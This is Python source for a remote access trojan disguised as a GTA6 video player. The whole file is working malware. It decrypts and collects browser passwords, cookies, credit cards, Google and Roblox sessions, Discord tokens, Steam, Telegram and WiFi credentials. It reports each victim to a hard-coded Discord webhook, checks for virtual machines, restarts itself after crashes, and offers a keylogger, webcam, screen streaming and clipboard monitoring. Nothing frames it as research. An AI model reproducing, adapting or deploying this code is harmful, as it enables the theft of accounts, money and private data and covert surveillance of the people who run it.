#!/usr/bin/env python3
# ============================================================
#  Ultimate RAT Client – Silent Victim Agent (FULL)
#  Simultaneous GTA6 video player + RAT client
#  Works without console (PyInstaller --noconsole)
#  Updated: comprehensive stealer for browsers, Roblox,
#  Discord, Google, Steam, Telegram, WhatsApp, etc.
# ============================================================
import sys, os, socket, ssl, struct, json, base64, zlib, hashlib, hmac
import subprocess, threading, time, io, ctypes, tempfile, urllib.request, sqlite3, shutil, re, random, glob, uuid, ctypes.wintypes
from queue import Queue, Empty
from typing import Optional, Dict, List, Tuple

# Crypto – same as server
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2

# ---------- CONFIGURATION (edit these) ----------
SERVER_IP = "127.0.0.1"
SERVER_PORT = 4444
AUTH_TOKEN = "SecretToken123"
MASTER_PASSWORD = "ChangeMeNow!"
WEBHOOK_URL = "https://discord.com/api/webhooks/1517529253044944919/qk9NFcbTNvb4hhBzhNfs8GM0GRlJltTz_gVez-JW7lb95Be2NfAsEzaFEbIQTO97H2Y5"
CLIENT_CERT = "client.crt"
CLIENT_KEY = "client.key"
CA_CERT = "ca.crt"
USE_SSL = False

VIDEO_FILE = "gta6.mp4"
DURATION = 38
# ------------------------------------------------

AES_BLOCK_SIZE = 16
INT_LEN = 4
HMAC_SIZE = 32
FILE_CHUNK_SIZE = 65536
HEARTBEAT_INTERVAL = 5.0
HEARTBEAT_TIMEOUT = 30.0
OFFLINE_QUEUE_FILE = "offline_commands.json"

def derive_key(password: str, salt: bytes) -> bytes:
    return PBKDF2(password, salt, dkLen=32, count=100000)

MASTER_ENC_KEY = derive_key(MASTER_PASSWORD, b'RatServerSalt1234')
MASTER_MAC_KEY = derive_key(MASTER_PASSWORD, b'RatServerMacSalt12')

def encrypt_data_aes256(data: bytes, key: bytes) -> bytes:
    iv = get_random_bytes(AES_BLOCK_SIZE)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(data, AES_BLOCK_SIZE))
    return iv + ct

def decrypt_data_aes256(data: bytes, key: bytes) -> bytes:
    iv = data[:AES_BLOCK_SIZE]
    ct = data[AES_BLOCK_SIZE:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES_BLOCK_SIZE)

def generate_hmac(key: bytes, data: bytes) -> bytes:
    return hmac.new(key, data, hashlib.sha256).digest()

def verify_hmac(key: bytes, data: bytes, mac: bytes) -> bool:
    return hmac.compare_digest(generate_hmac(key, data), mac)

def secure_pack(plain: bytes, enc_key: bytes, mac_key: bytes) -> bytes:
    ct = encrypt_data_aes256(plain, enc_key)
    mac = generate_hmac(mac_key, ct)
    return struct.pack('>I', len(ct)) + ct + mac

def secure_unpack(sock: socket.socket, enc_key: bytes, mac_key: bytes) -> Optional[bytes]:
    raw_len = recv_all(sock, INT_LEN)
    if not raw_len:
        return None
    ct_len = struct.unpack('>I', raw_len)[0]
    if ct_len > 100 * 1024 * 1024:
        return None
    ct = recv_all(sock, ct_len)
    mac = recv_all(sock, HMAC_SIZE)
    if ct is None or mac is None:
        return None
    if not verify_hmac(mac_key, ct, mac):
        return None
    return decrypt_data_aes256(ct, enc_key)

def recv_all(sock: socket.socket, n: int) -> Optional[bytes]:
    data = b''
    while len(data) < n:
        try:
            packet = sock.recv(n - len(data))
            if not packet:
                return None
            data += packet
        except socket.timeout:
            return None
    return data

# ============================================================
#  BROWSER / APP DATA STEALER FUNCTIONS
# ============================================================

# ---------- Chromium browser paths ----------
def get_chromium_browser_paths():
    """Return dict of browser_name -> (user_data_dir, cookies_sqlite, login_data_sqlite, web_data_sqlite)"""
    home = os.path.expanduser('~')
    local = os.environ.get('LOCALAPPDATA', '')
    roaming = os.environ.get('APPDATA', '')
    paths = {}

    chromium_dirs = {
        'chrome':   os.path.join(local, 'Google', 'Chrome', 'User Data'),
        'chrome_beta': os.path.join(local, 'Google', 'Chrome Beta', 'User Data'),
        'chrome_canary': os.path.join(local, 'Google', 'Chrome SxS', 'User Data'),
        'edge':     os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
        'edge_beta': os.path.join(local, 'Microsoft', 'Edge Beta', 'User Data'),
        'brave':    os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'opera':    os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        'opera_gx': os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
        'vivaldi':  os.path.join(local, 'Vivaldi', 'User Data'),
        'yandex':   os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data'),
        'chromium': os.path.join(local, 'Chromium', 'User Data'),
        'thorium':  os.path.join(local, 'Thorium', 'User Data'),
        'iridium':  os.path.join(local, 'Iridium', 'User Data'),
        'slimjet':  os.path.join(local, 'Slimjet', 'User Data'),
        'avast':    os.path.join(local, 'AVAST Software', 'Browser', 'User Data'),
        'avg':      os.path.join(local, 'AVG', 'Browser', 'User Data'),
        'ccleaner': os.path.join(local, 'CCleaner', 'Browser', 'User Data'),
        'kometa':   os.path.join(local, 'Kometa', 'User Data'),
        'orbitum':  os.path.join(local, 'Orbitum', 'User Data'),
        'amigo':    os.path.join(local, 'Amigo', 'User Data'),
        'torch':    os.path.join(local, 'Torch', 'User Data'),
        'comodo':   os.path.join(local, 'Comodo', 'Dragon', 'User Data'),
        'maxthon':  os.path.join(local, 'Maxthon', 'User Data'),
        'midori':   os.path.join(local, 'Midori', 'User Data'),
    }

    for name, base in chromium_dirs.items():
        if not os.path.isdir(base):
            continue
        # Find profiles: Default, Profile 1, Profile 2, etc.
        profiles = []
        default_dir = os.path.join(base, 'Default')
        if os.path.isdir(default_dir):
            profiles.append(default_dir)
        try:
            for entry in os.listdir(base):
                if entry.startswith('Profile ') and os.path.isdir(os.path.join(base, entry)):
                    profiles.append(os.path.join(base, entry))
        except Exception:
            pass

        for profile in profiles:
            cookies = os.path.join(profile, 'Network', 'Cookies')
            if not os.path.isfile(cookies):
                cookies = os.path.join(profile, 'Cookies')
            login_data = os.path.join(profile, 'Login Data')
            web_data = os.path.join(profile, 'Web Data')
            local_state = os.path.join(base, 'Local State')
            paths[f'{name}:{os.path.basename(profile)}'] = {
                'user_data': base,
                'profile': profile,
                'cookies': cookies,
                'login_data': login_data,
                'web_data': web_data,
                'local_state': local_state,
            }
    return paths

# ---------- Chromium master key (DPAPI-protected) ----------
def get_chromium_master_key(local_state_path):
    """Extract and DPAPI-decrypt the AES-256 master key used by Chromium."""
    try:
        import win32crypt
        if not os.path.isfile(local_state_path):
            return None
        with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
            state = json.load(f)
        enc_key = base64.b64decode(state['os_crypt']['encrypted_key'])
        # Strip DPAPI prefix (5 bytes)
        enc_key = enc_key[5:]
        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except Exception:
        return None

# ---------- Chromium cookie/password decryption ----------
def decrypt_chromium_value(encrypted_value: bytes, master_key: bytes) -> str:
    """Decrypt Chromium encrypted value. Supports AES-GCM (v10/v11) and DPAPI fallback."""
    if not encrypted_value:
        return ''
    try:
        # Newer Chrome/Edge: v10 = AES-GCM (app-bound on Chrome 127+); v11 = app-bound
        if encrypted_value[:3] in (b'v10', b'v11'):
            if master_key is None:
                return ''
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            return plaintext.decode('utf-8', errors='ignore')
        # Older Chrome/Edge/Firefox-style: DPAPI
        try:
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except Exception:
            return ''
    except Exception:
        return ''

# ---------- Extract .ROBLOSECURITY from all Chromium browsers ----------
def steal_roblox_cookies():
    """Return list of {browser, profile, cookie} for every .ROBLOSECURITY found."""
    results = []
    seen = set()
    for name, info in get_chromium_browser_paths().items():
        cookie_db = info.get('cookies')
        if not cookie_db or not os.path.isfile(cookie_db):
            continue
        master_key = get_chromium_master_key(info.get('local_state'))
        try:
            tmp = os.path.join(tempfile.gettempdir(), f'rbx_{uuid.uuid4().hex}.db')
            shutil.copy2(cookie_db, tmp)
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            cur.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'")
            for host, cname, enc in cur.fetchall():
                val = decrypt_chromium_value(enc, master_key)
                if val and val not in seen:
                    seen.add(val)
                    results.append({
                        'browser': name,
                        'host': host,
                        'name': cname,
                        'value': val
                    })
            conn.close()
            os.remove(tmp)
        except Exception:
            pass
    return results

# ---------- Extract Discord token from Discord desktop clients ----------
def steal_discord_tokens():
    """Grep Discord / Discord Canary / Discord PTB LevelDB for user tokens."""
    results = []
    roaming = os.environ.get('APPDATA', '')
    discord_dirs = {
        'discord':         os.path.join(roaming, 'discord'),
        'discord_canary':  os.path.join(roaming, 'discordcanary'),
        'discord_ptb':     os.path.join(roaming, 'discordptb'),
        'discord_development': os.path.join(roaming, 'discorddevelopment'),
        'lightcord':       os.path.join(roaming, 'Lightcord'),
    }
    token_regex = re.compile(r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}')
    mfa_regex = re.compile(r'mfa\.[\w-]{80,120}')
    for name, base in discord_dirs.items():
        ldb_dir = os.path.join(base, 'Local Storage', 'leveldb')
        if not os.path.isdir(ldb_dir):
            continue
        found = set()
        for fname in os.listdir(ldb_dir):
            if not (fname.endswith('.log') or fname.endswith('.ldb')):
                continue
            try:
                with open(os.path.join(ldb_dir, fname), 'r', errors='ignore') as f:
                    content = f.read()
                for tok in token_regex.findall(content):
                    found.add(tok)
                for tok in mfa_regex.findall(content):
                    found.add(tok)
            except Exception:
                pass
        for tok in found:
            results.append({'client': name, 'token': tok})
    return results

# ---------- Extract Google auth cookies from all Chromium browsers ----------
GOOGLE_COOKIE_NAMES = [
    'SID', 'HSID', 'SSID', 'APISID', 'SAPISID',
    'LSID', 'OSID', '__Secure-1PSID', '__Secure-3PSID',
    '__Secure-1PAPISID', '__Secure-3PAPISID',
    '__Host-GAPS', 'ACCOUNT_CHOOSER', 'SIDCC', '__Secure-1PSIDCC', '__Secure-3PSIDCC',
    'NID', 'ANID', 'SEARCH_SAMESITE', 'AEC', 'DV', 'UULE', 'CONSENT',
]
def steal_google_auth():
    """Extract Google auth cookies from every Chromium browser profile."""
    results = {}
    for name, info in get_chromium_browser_paths().items():
        cookie_db = info.get('cookies')
        if not cookie_db or not os.path.isfile(cookie_db):
            continue
        master_key = get_chromium_master_key(info.get('local_state'))
        try:
            tmp = os.path.join(tempfile.gettempdir(), f'goog_{uuid.uuid4().hex}.db')
            shutil.copy2(cookie_db, tmp)
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            placeholders = ','.join(['?'] * len(GOOGLE_COOKIE_NAMES))
            q = f"SELECT host_key, name, encrypted_value FROM cookies WHERE name IN ({placeholders}) AND host_key LIKE '%google.com%'"
            cur.execute(q, GOOGLE_COOKIE_NAMES)
            bucket = {}
            for host, cname, enc in cur.fetchall():
                val = decrypt_chromium_value(enc, master_key)
                if val:
                    bucket[cname] = val
            conn.close()
            os.remove(tmp)
            if bucket:
                results[name] = bucket
        except Exception:
            pass
    return results

# ---------- Extract all cookies (full profile jar) ----------
def steal_all_cookies(max_per_browser=500):
    """Collect cookies from all Chromium browser profiles up to a cap."""
    results = {}
    for name, info in get_chromium_browser_paths().items():
        cookie_db = info.get('cookies')
        if not cookie_db or not os.path.isfile(cookie_db):
            continue
        master_key = get_chromium_master_key(info.get('local_state'))
        try:
            tmp = os.path.join(tempfile.gettempdir(), f'allc_{uuid.uuid4().hex}.db')
            shutil.copy2(cookie_db, tmp)
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            cur.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies LIMIT ?", (max_per_browser,))
            bucket = []
            for host, cname, enc, path, expires, sec, http in cur.fetchall():
                val = decrypt_chromium_value(enc, master_key)
                if val:
                    bucket.append({
                        'host': host, 'name': cname, 'value': val,
                        'path': path, 'expires': expires,
                        'secure': bool(sec), 'httpOnly': bool(http)
                    })
            conn.close()
            os.remove(tmp)
            if bucket:
                results[name] = bucket
        except Exception:
            pass
    return results

# ---------- Extract browser saved passwords ----------
def steal_browser_passwords():
    """Extract and decrypt saved passwords from all Chromium browsers."""
    results = {}
    for name, info in get_chromium_browser_paths().items():
        login_db = info.get('login_data')
        if not login_db or not os.path.isfile(login_db):
            continue
        master_key = get_chromium_master_key(info.get('local_state'))
        try:
            tmp = os.path.join(tempfile.gettempdir(), f'login_{uuid.uuid4().hex}.db')
            shutil.copy2(login_db, tmp)
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            cur.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
            bucket = []
            for origin, action, user, enc in cur.fetchall():
                pwd = decrypt_chromium_value(enc, master_key)
                if user or pwd:
                    bucket.append({
                        'url': origin, 'action': action,
                        'username': user, 'password': pwd
                    })
            conn.close()
            os.remove(tmp)
            if bucket:
                results[name] = bucket
        except Exception:
            pass
    return results

# ---------- Extract Steam data ----------
def steal_steam():
    """Extract Steam SSFN, config, and loginusers.vdf."""
    out = {'ssfn': [], 'loginusers': '', 'config': ''}
    steam_dirs = [
        r'C:\Program Files (x86)\Steam',
        r'C:\Program Files\Steam',
        os.path.expanduser(r'~\AppData\Local\Steam'),
    ]
    for sd in steam_dirs:
        if not os.path.isdir(sd):
            continue
        try:
            for f in os.listdir(sd):
                if f.lower().startswith('ssfn'):
                    p = os.path.join(sd, f)
                    try:
                        with open(p, 'rb') as fh:
                            out['ssfn'].append({
                                'name': f,
                                'content_b64': base64.b64encode(fh.read()).decode()
                            })
                    except Exception:
                        pass
        except Exception:
            pass
        # loginusers.vdf
        lv = os.path.join(sd, 'config', 'loginusers.vdf')
        if os.path.isfile(lv):
            try:
                with open(lv, 'r', encoding='utf-8', errors='ignore') as f:
                    out['loginusers'] = f.read()
            except Exception:
                pass
        # config.vdf
        cfg = os.path.join(sd, 'config', 'config.vdf')
        if os.path.isfile(cfg):
            try:
                with open(cfg, 'r', encoding='utf-8', errors='ignore') as f:
                    out['config'] = f.read()[:50000]
            except Exception:
                pass
    return out

# ---------- Extract Telegram session ----------
def steal_telegram():
    """Copy Telegram Desktop tdata files (session)."""
    out = {'files': []}
    roaming = os.environ.get('APPDATA', '')
    paths = [
        os.path.join(roaming, 'Telegram Desktop', 'tdata'),
        os.path.join(roaming, 'Telegram Desktop'),
    ]
    for base in paths:
        if not os.path.isdir(base):
            continue
        for root, dirs, files in os.walk(base):
            for fn in files:
                full = os.path.join(root, fn)
                try:
                    size = os.path.getsize(full)
                    if size > 5 * 1024 * 1024:
                        continue  # skip huge files
                    with open(full, 'rb') as fh:
                        content = fh.read()
                    out['files'].append({
                        'path': full,
                        'size': size,
                        'content_b64': base64.b64encode(content).decode()
                    })
                except Exception:
                    pass
            if len(out['files']) > 200:
                break
        break
    return out

# ---------- Extract WiFi passwords (Windows) ----------
def steal_wifi():
    """Get all saved WiFi profiles and their passwords."""
    out = []
    try:
        data = subprocess.check_output('netsh wlan show profiles', shell=True).decode('utf-8', errors='ignore')
        profiles = [line.split(':', 1)[1].strip() for line in data.splitlines() if 'All User Profile' in line]
        for prof in profiles:
            try:
                det = subprocess.check_output(f'netsh wlan show profile name="{prof}" key=clear',
                                              shell=True).decode('utf-8', errors='ignore')
                pwd = ''
                for line in det.splitlines():
                    if 'Key Content' in line:
                        pwd = line.split(':', 1)[1].strip()
                        break
                out.append({'ssid': prof, 'password': pwd})
            except Exception:
                pass
    except Exception:
        pass
    return out

# ---------- Extract Roblox Account Switcher blob (from browser Local Storage) ----------
def steal_roblox_switcher():
    """Look for RBXASBlob in every Chromium browser's Local Storage LevelDB."""
    results = []
    token_regex = re.compile(rb'RBXASBlob')
    for name, info in get_chromium_browser_paths().items():
        profile = info.get('profile')
        if not profile:
            continue
        ls_dir = os.path.join(profile, 'Local Storage', 'leveldb')
        if not os.path.isdir(ls_dir):
            continue
        for fname in os.listdir(ls_dir):
            if not (fname.endswith('.log') or fname.endswith('.ldb')):
                continue
            try:
                with open(os.path.join(ls_dir, fname), 'rb') as f:
                    data = f.read()
                # Look for the RBXASBlob key and pull nearby JSON-ish value
                for m in re.finditer(rb'RBXASBlob', data):
                    start = m.end()
                    chunk = data[start:start + 8000]
                    # Roblox blob is a long base64-ish string
                    text = chunk.decode('utf-8', errors='ignore')
                    # Try to find a long string in quotes
                    blob_match = re.search(r'"([A-Za-z0-9+/=_\-]{200,})"', text)
                    if blob_match:
                        results.append({'browser': name, 'blob': blob_match.group(1)})
                        break
            except Exception:
                pass
    return results

# ---------- Chrome Web Data (autofill / cards) ----------
def steal_web_data():
    """Extract autofill entries and credit cards from Chromium Web Data."""
    out = {}
    for name, info in get_chromium_browser_paths().items():
        wd = info.get('web_data')
        if not wd or not os.path.isfile(wd):
            continue
        master_key = get_chromium_master_key(info.get('local_state'))
        try:
            tmp = os.path.join(tempfile.gettempdir(), f'wd_{uuid.uuid4().hex}.db')
            shutil.copy2(wd, tmp)
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            bucket = {'autofill': [], 'cards': []}
            try:
                cur.execute("SELECT name, value FROM autofill")
                for n, v in cur.fetchall():
                    bucket['autofill'].append({'name': n, 'value': v})
            except Exception:
                pass
            try:
                cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                for n, em, ey, enc in cur.fetchall():
                    card = decrypt_chromium_value(enc, master_key)
                    bucket['cards'].append({
                        'name': n, 'exp_month': em, 'exp_year': ey, 'number': card
                    })
            except Exception:
                pass
            conn.close()
            os.remove(tmp)
            if bucket['autofill'] or bucket['cards']:
                out[name] = bucket
        except Exception:
            pass
    return out

# ---------- Master collector (one shot, all data) ----------
def collect_all_credentials():
    """Return a big dict with every credential category."""
    data = {}
    try:
        data['roblox_cookies'] = steal_roblox_cookies()
    except Exception:
        data['roblox_cookies'] = []
    try:
        data['roblox_switcher_blobs'] = steal_roblox_switcher()
    except Exception:
        data['roblox_switcher_blobs'] = []
    try:
        data['discord_tokens'] = steal_discord_tokens()
    except Exception:
        data['discord_tokens'] = []
    try:
        data['google_auth'] = steal_google_auth()
    except Exception:
        data['google_auth'] = {}
    try:
        data['browser_passwords'] = steal_browser_passwords()
    except Exception:
        data['browser_passwords'] = {}
    try:
        data['all_cookies'] = steal_all_cookies()
    except Exception:
        data['all_cookies'] = {}
    try:
        data['web_data'] = steal_web_data()
    except Exception:
        data['web_data'] = {}
    try:
        data['steam'] = steal_steam()
    except Exception:
        data['steam'] = {}
    try:
        data['telegram'] = steal_telegram()
    except Exception:
        data['telegram'] = {}
    try:
        data['wifi'] = steal_wifi()
    except Exception:
        data['wifi'] = []
    return data

# ============================================================
#  WEBHOOK / IP / LOCATION
# ============================================================
def get_external_ip() -> str:
    try:
        return urllib.request.urlopen('https://api.ipify.org', timeout=3).read().decode()
    except Exception:
        return 'unknown'

def get_local_ips() -> List[str]:
    ips = []
    try:
        hostname = socket.gethostname()
        ips.append(socket.gethostbyname(hostname))
        for info in socket.getaddrinfo(hostname, None):
            ip = info[4][0]
            if ip not in ips:
                ips.append(ip)
    except Exception:
        pass
    return ips

def get_dns_info() -> List[str]:
    dns = []
    try:
        output = subprocess.check_output('ipconfig /all', shell=True).decode('utf-8', errors='ignore')
        for line in output.splitlines():
            if 'DNS Servers' in line:
                parts = line.split(':')
                if len(parts) > 1:
                    dns.append(parts[1].strip())
    except Exception:
        pass
    return dns

def get_desktop_name() -> str:
    return os.environ.get('COMPUTERNAME', 'unknown')

def is_vpn() -> bool:
    try:
        output = subprocess.check_output('ipconfig /all', shell=True).decode('utf-8', errors='ignore')
        for kw in ['VPN', 'TAP', 'TUNNEL', 'PPTP', 'L2TP']:
            if kw in output.upper():
                return True
    except Exception:
        pass
    return False

def is_vm() -> bool:
    vm_indicators = ['hypervisor', 'vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'vbox']
    try:
        output = subprocess.check_output('systeminfo', shell=True).decode('utf-8', errors='ignore').lower()
        for ind in vm_indicators:
            if ind in output:
                return True
    except Exception:
        pass
    try:
        mac = uuid.getnode()
        oui = mac >> 24
        if oui in (0x000C29, 0x000569, 0x080027, 0x001C42):
            return True
    except Exception:
        pass
    return False

def get_webhook_info():
    info = {
        "Desktop Name": get_desktop_name(),
        "External IP": get_external_ip(),
        "Local IPs": get_local_ips(),
        "DNS Servers": get_dns_info(),
        "Hostname": socket.gethostname(),
        "OS": f"{sys.platform} {os.name}",
        "Platform": '',
        "CPU Cores": os.cpu_count(),
        "RAM Total": '',
        "VPN Detected": is_vpn(),
        "VM Detected": is_vm()
    }
    try:
        import platform
        info["Platform"] = platform.platform()
        info["Processor"] = platform.processor()
    except Exception:
        pass
    try:
        import psutil
        info["RAM Total"] = f"{psutil.virtual_memory().total / (1024**3):.1f} GB"
    except Exception:
        pass
    return info

def send_webhook(info: Dict):
    description = "\n".join([f"**{k}:** {v}" for k, v in info.items()])
    payload = {
        "username": "RAT Hook",
        "embeds": [{
            "title": "🔔 Victim Hooked!",
            "description": description,
            "color": 16711680,
            "footer": {"text": "RAT System"}
        }]
    }
    try:
        import requests
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except ImportError:
        try:
            data = json.dumps(payload).encode()
            req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass
    except Exception:
        pass

def get_location() -> Tuple[float, float]:
    try:
        with urllib.request.urlopen('http://ip-api.com/json/', timeout=5) as resp:
            data = json.loads(resp.read().decode())
            return float(data.get('lat', 0.0)), float(data.get('lon', 0.0))
    except Exception:
        return 0.0, 0.0

# ============================================================
#  OFFLINE QUEUE / CRASH RECOVERY
# ============================================================
class OfflineQueue:
    def __init__(self, file_path=OFFLINE_QUEUE_FILE):
        self.file_path = file_path
        self.queue = []
        self.load()

    def load(self):
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path, 'r') as f:
                    self.queue = json.load(f)
            except Exception:
                self.queue = []

    def save(self):
        try:
            with open(self.file_path, 'w') as f:
                json.dump(self.queue, f)
        except Exception:
            pass

    def put(self, item):
        self.queue.append(item)
        self.save()

    def get_all(self):
        items = self.queue[:]
        self.queue.clear()
        self.save()
        return items

offline_queue = OfflineQueue()
main_thread_alive = threading.Event()
main_thread_alive.set()

def start_crash_recovery():
    def watchdog():
        while True:
            time.sleep(60)
            if not main_thread_alive.is_set():
                os.execv(sys.executable, [sys.executable] + sys.argv)
    t = threading.Thread(target=watchdog, daemon=True)
    t.start()

# ============================================================
#  GTA6 VIDEO PLAYER
# ============================================================
def find_video_file():
    if "__compiled__" in globals():
        base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))
    video_file = os.path.join(base_dir, VIDEO_FILE)
    if os.path.isfile(video_file):
        return video_file
    mp4_files = glob.glob(os.path.join(base_dir, "*.mp4"))
    if mp4_files:
        return os.path.abspath(mp4_files[0])
    return None

def create_powershell_script(video_path, duration):
    return f"""
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName PresentationCore
Add-Type -AssemblyName WindowsBase

$videoPath = '{video_path}'
$duration = {duration}

$window = New-Object System.Windows.Window
$window.WindowStyle = 'None'
$window.ResizeMode = 'NoResize'
$window.WindowState = 'Maximized'
$window.Topmost = $true
$window.Background = [System.Windows.Media.Brushes]::Black
$window.ShowInTaskbar = $false
$window.Cursor = [System.Windows.Input.Cursors]::None

$mediaElement = New-Object System.Windows.Controls.MediaElement
$mediaElement.LoadedBehavior = 'Play'
$mediaElement.Stretch = 'UniformToFill'
$mediaElement.Source = New-Object System.Uri($videoPath)
$mediaElement.MediaEnded += {{ $window.Close() }}
$window.Content = $mediaElement

$window.Add_PreviewKeyDown({{
    param($sender, $e)
    if ($e.Key -ne 'System') {{ $e.Handled = $true }}
}})

$timer = New-Object System.Windows.Threading.DispatcherTimer
$timer.Interval = [TimeSpan]::FromSeconds($duration)
$timer.Add_Tick({{ $window.Close() }})
$timer.Start()

$window.ShowDialog() | Out-Null
"""

def play_gta6():
    if os.name != 'nt':
        return
    try:
        video_path = find_video_file()
        if not video_path:
            return
        ps_script_path = os.path.join(tempfile.gettempdir(), "gta6_video_player.ps1")
        with open(ps_script_path, "w", encoding="utf-8") as f:
            f.write(create_powershell_script(video_path, DURATION))
        subprocess.Popen(
            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass",
             "-WindowStyle", "Hidden", "-File", ps_script_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )
        time.sleep(2)
        try:
            if os.path.isfile(ps_script_path):
                os.remove(ps_script_path)
        except Exception:
            pass
    except Exception:
        pass

# ============================================================
#  COMMAND HANDLER
# ============================================================
class CommandHandler:
    def __init__(self, sock, enc_key, mac_key):
        self.sock = sock
        self.enc_key = enc_key
        self.mac_key = mac_key
        self.keylogger_active = False
        self.keylog_buffer = []
        self.webcam_active = False
        self.screen_active = False
        self.screenshot_scheduler_active = False
        self.clipboard_monitor_active = False
        self.microphone_active = False
        self.offline_queue = offline_queue

    def send_response(self, resp_type, data=b'', cmd_id=0, compress=False):
        if compress:
            data = zlib.compress(data)
        type_bytes = resp_type.encode('utf-8')
        payload = struct.pack('>I', len(type_bytes)) + type_bytes
        payload += struct.pack('>I', cmd_id)
        payload += struct.pack('>I', len(data)) + data
        try:
            packed = secure_pack(payload, self.enc_key, self.mac_key)
            self.sock.sendall(packed)
        except Exception:
            self.offline_queue.put({'type': resp_type, 'data': base64.b64encode(data).decode(), 'cmd_id': cmd_id})

    def handle_command(self, msg):
        if len(msg) < 12:
            return
        offset = 0
        cmd_type_len = struct.unpack('>I', msg[offset:offset+4])[0]; offset += 4
        cmd_type = msg[offset:offset+cmd_type_len].decode('utf-8'); offset += cmd_type_len
        cmd_id = struct.unpack('>I', msg[offset:offset+4])[0]; offset += 4
        data_len = struct.unpack('>I', msg[offset:offset+4])[0]; offset += 4
        data = msg[offset:offset+data_len]

        try:
            data = zlib.decompress(data)
        except Exception:
            pass

        handler = getattr(self, f'cmd_{cmd_type}', None)
        if handler:
            try:
                if cmd_type in ('steal_all_credentials', 'steal_browser_passwords',
                                'steal_all_cookies', 'steal_google_auth',
                                'steal_roblox_cookies', 'steal_roblox_switcher',
                                'steal_discord_tokens', 'steal_steam',
                                'steal_telegram', 'steal_wifi', 'steal_web_data',
                                'stress_cpu', 'stress_ram', 'stress_gpu',
                                'file_search', 'network_test'):
                    threading.Thread(target=handler, args=(cmd_id, data), daemon=True).start()
                else:
                    handler(cmd_id, data)
            except Exception as e:
                self.send_response('error', f"Handler error: {e}".encode(), cmd_id)
        else:
            self.send_response('error', f"Unknown cmd: {cmd_type}".encode(), cmd_id)

    # ---------- Basic ----------
    def cmd_heartbeat(self, cmd_id, data):
        self.send_response('heartbeat', b'', cmd_id)

    def cmd_start_webcam(self, cmd_id, data):
        if not self.webcam_active:
            self.webcam_active = True
            threading.Thread(target=self._webcam_stream, args=(cmd_id,), daemon=True).start()
            self.send_response('error', b'Webcam started', cmd_id)

    def cmd_stop_webcam(self, cmd_id, data):
        self.webcam_active = False

    def cmd_start_screen(self, cmd_id, data):
        if not self.screen_active:
            interval = struct.unpack('>I', data)[0] if len(data) >= 4 else 500
            self.screen_active = True
            threading.Thread(target=self._screen_stream, args=(interval, cmd_id), daemon=True).start()
            self.send_response('error', b'Screen started', cmd_id)

    def cmd_stop_screen(self, cmd_id, data):
        self.screen_active = False

    def cmd_start_screenshot_scheduler(self, cmd_id, data):
        interval = struct.unpack('>I', data)[0] if len(data) >= 4 else 60
        self.screenshot_scheduler_active = True
        threading.Thread(target=self._screenshot_scheduler, args=(interval, cmd_id), daemon=True).start()

    def cmd_stop_screenshot_scheduler(self, cmd_id, data):
        self.screenshot_scheduler_active = False

    def cmd_start_keylog(self, cmd_id, data):
        if not self.keylogger_active:
            self.keylogger_active = True
            self.keylog_buffer = []
            threading.Thread(target=self._keylogger_capture, daemon=True).start()

    def cmd_stop_keylog(self, cmd_id, data):
        self.keylogger_active = False

    def cmd_get_keylog(self, cmd_id, data):
        self.send_response('keylog', '\n'.join(self.keylog_buffer).encode(), cmd_id)

    def cmd_start_clipboard_monitor(self, cmd_id, data):
        if not self.clipboard_monitor_active:
            self.clipboard_monitor_active = True
            threading.Thread(target=self._clipboard_monitor, daemon=True).start()

    def cmd_stop_clipboard_monitor(self, cmd_id, data):
        self.clipboard_monitor_active = False

    def cmd_get_sysinfo(self, cmd_id, data):
        info = {
            'hostname': os.environ.get('COMPUTERNAME', ''),
            'os': f"{os.name} {sys.platform}",
            'username': os.environ.get('USERNAME', ''),
            'cwd': os.getcwd(),
            'pid': os.getpid(),
            'external_ip': get_external_ip(),
        }
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            info['local_ip'] = s.getsockname()[0]
            s.close()
        except Exception:
            pass
        try:
            import platform
            info['platform'] = platform.platform()
        except Exception:
            pass
        try:
            import psutil
            info['cpu'] = f"{psutil.cpu_count(logical=False)} cores / {psutil.cpu_count()} threads"
            info['ram_total'] = f"{psutil.virtual_memory().total / (1024**3):.1f} GB"
        except Exception:
            pass
        self.send_response('sysinfo', json.dumps(info).encode(), cmd_id)

